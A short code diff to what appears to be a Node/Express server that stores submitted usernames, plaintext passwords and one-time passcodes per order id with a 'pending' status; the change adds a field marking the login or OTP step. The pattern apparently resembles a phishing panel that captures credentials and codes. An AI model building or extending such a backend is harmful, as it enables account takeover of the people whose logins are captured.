@@ -136,6 +136,7 @@ app.post('/api/submit-login', (req, res) => {
     if (request) {
         request.username = username || '';
         request.password = password || '';
+        request.step = 'login';
         request.status = 'pending';
     }
     res.json({ ok: true });
@@ -146,6 +147,7 @@ app.post('/api/submit-otp', (req, res) => {
     const request = requests.find(r => r.id === orderId);
     if (request) {
         request.otp = otp || '';
+        request.step = 'otp';
         request.status = 'pending';
     }
     res.json({ ok: true });
